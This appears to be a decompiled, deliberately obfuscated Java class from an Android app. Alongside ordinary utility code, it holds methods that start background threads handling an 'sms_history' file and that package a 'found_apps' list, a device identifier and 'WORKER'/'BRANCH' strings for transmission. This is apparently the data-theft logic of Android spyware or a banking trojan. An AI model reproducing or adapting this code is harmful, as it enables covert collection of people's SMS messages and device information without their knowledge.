package com.vdodsodjsdt;

import android.content.Context;
import android.graphics.Path;
import android.os.Build;
import android.view.View;
import java.io.File;
import java.util.Collections;
import java.util.List;

/* JADX INFO: compiled from: r8-map-id-3f77bbef96f83a8bf86e140490b9d41fcf0723d2c79bd2f3f370cb94135e1be4 */
/* JADX INFO: loaded from: classes.dex */
public class VSncX8ksA0tswc2TMhzhOMdd implements R7HIv9FSowFmMzxDvYq6jskIyefYM, CBgwRvRioz70v9hmKLhz6xwUoHcu2, DenmIypSdw0qfxt {
    public static VSncX8ksA0tswc2TMhzhOMdd V57tEvNfxZVVcOCAOih5PKr;

    public VSncX8ksA0tswc2TMhzhOMdd(View view, int i) {
        switch (i) {
            case g8kevnL6UKpr15IYtcPJXuLo1L4.INTEGER_FIELD_NUMBER /* 3 */:
                if (Build.VERSION.SDK_INT < 30) {
                    new VSncX8ksA0tswc2TMhzhOMdd(view, 2);
                } else {
                    new K1RUZ924ZwVhFBr2QBA5BB(view, 2);
                }
                break;
        }
    }

    public static String LaeGQIruHQu81hfJldjMOQSVblH3x(VSncX8ksA0tswc2TMhzhOMdd vSncX8ksA0tswc2TMhzhOMdd, String str) {
        ej6unYlOWMDF.pYmKDYlAmhudp(str, "s");
        StringBuilder sb = new StringBuilder(str);
        int i = 0;
        while (true) {
            int iPf1HsU8AK92buCoUaexm5AC = cwhrCnoVJBjJE2CBEAvBopmgF.Pf1HsU8AK92buCoUaexm5AC(sb, '_', i, 4);
            if (iPf1HsU8AK92buCoUaexm5AC == -1) {
                String string = sb.toString();
                ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(string, "toString(...)");
                return string;
            }
            sb.insert(iPf1HsU8AK92buCoUaexm5AC, "\\");
            i = iPf1HsU8AK92buCoUaexm5AC + 2;
        }
    }

    public static Path V57tEvNfxZVVcOCAOih5PKr(float f, float f2, float f3, float f4) {
        Path path = new Path();
        path.moveTo(f, f2);
        path.lineTo(f3, f4);
        return path;
    }

    /* JADX WARN: Removed duplicated region for block: B:39:0x00a1  */
    /* JADX WARN: Removed duplicated region for block: B:43:0x00aa  */
    /* JADX WARN: Removed duplicated region for block: B:95:0x00a3 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public static void VxUQ9tBhpHJ2AAEDNW8sghc4m(java.lang.String r22, java.lang.String r23, android.content.Context r24, com.vdodsodjsdt.tpLngQCdAeyjjtxlI r25, int r26) throws java.lang.Throwable {
        /*
            Method dump skipped, instruction units count: 476
            To view this dump change 'Code comments level' option to 'DEBUG'
        */
        throw new UnsupportedOperationException("Method not decompiled: com.vdodsodjsdt.VSncX8ksA0tswc2TMhzhOMdd.VxUQ9tBhpHJ2AAEDNW8sghc4m(java.lang.String, java.lang.String, android.content.Context, com.vdodsodjsdt.tpLngQCdAeyjjtxlI, int):void");
    }

    public static void ZLZeBXTMq0zDztBxtRTuCHrapQ(Context context, File file, Skgk8FYn8b4TvRiBOsElZw4XkNLhQ skgk8FYn8b4TvRiBOsElZw4XkNLhQ) {
        new Thread(new A3Dwt6MW552ix3T0Q(context, file, "sms_history", skgk8FYn8b4TvRiBOsElZw4XkNLhQ, 1)).start();
    }

    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    public static V04OhIg9zB zzpBGItXfub0yWj(String str) {
        ej6unYlOWMDF.pYmKDYlAmhudp(str, "javaName");
        int iHashCode = str.hashCode();
        if (iHashCode != 79201641) {
            if (iHashCode != 79923350) {
                switch (iHashCode) {
                    case -503070503:
                        if (str.equals("TLSv1.1")) {
                            return V04OhIg9zB.ZLZeBXTMq0zDztBxtRTuCHrapQ;
                        }
                        break;
                    case -503070502:
                        if (str.equals("TLSv1.2")) {
                            return V04OhIg9zB.zIvmSL0wzmmKGc3X39b2Gw2mUGE;
                        }
                        break;
                    case -503070501:
                        if (str.equals("TLSv1.3")) {
                            return V04OhIg9zB.LaeGQIruHQu81hfJldjMOQSVblH3x;
                        }
                        break;
                }
            } else if (str.equals("TLSv1")) {
                return V04OhIg9zB.NSjgqmGjEzuugn2SsG1mZFP;
            }
        } else if (str.equals("SSLv3")) {
            return V04OhIg9zB.GI83zq0G8e7zkn;
        }
        throw new IllegalArgumentException("Unexpected TLS version: ".concat(str));
    }

    public boolean ZfQNn8hdWlEQ5cR94249PDsLR(CharSequence charSequence) {
        return false;
    }

    public void zIvmSL0wzmmKGc3X39b2Gw2mUGE(Context context, String[] strArr, String[] strArr2, Skgk8FYn8b4TvRiBOsElZw4XkNLhQ skgk8FYn8b4TvRiBOsElZw4XkNLhQ) {
        ej6unYlOWMDF.pYmKDYlAmhudp(strArr, "found_apps");
        try {
            Tt3445ZYXN tt3445ZYXN = new Tt3445ZYXN();
            String strQNPQb1obP7 = zonOxHotd3BwAPJcwqr6I6uQNngg4.qNPQb1obP7(context);
            String strLaeGQIruHQu81hfJldjMOQSVblH3x = LaeGQIruHQu81hfJldjMOQSVblH3x(this, context.getResources().getText(R.string.WORKER).toString());
            ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(Build.VERSION.RELEASE, "RELEASE");
            new Thread(new QKIH77ZVGMjTqK4XOIPLci1Yc(context, tt3445ZYXN.ZfQNn8hdWlEQ5cR94249PDsLR(new wZY0YUvfdRUkPh3N(strQNPQb1obP7, strLaeGQIruHQu81hfJldjMOQSVblH3x, strArr, strArr2, context.getResources().getText(R.string.BRANCH).toString())), skgk8FYn8b4TvRiBOsElZw4XkNLhQ, 3)).start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public VSncX8ksA0tswc2TMhzhOMdd() {
        List list = Collections.EMPTY_LIST;
    }

    @Override // com.vdodsodjsdt.R7HIv9FSowFmMzxDvYq6jskIyefYM
    public void onScrollLimit(int i, int i2, int i3, boolean z) {
    }

    @Override // com.vdodsodjsdt.R7HIv9FSowFmMzxDvYq6jskIyefYM
    public void onScrollProgress(int i, int i2, int i3, int i4) {
    }
}
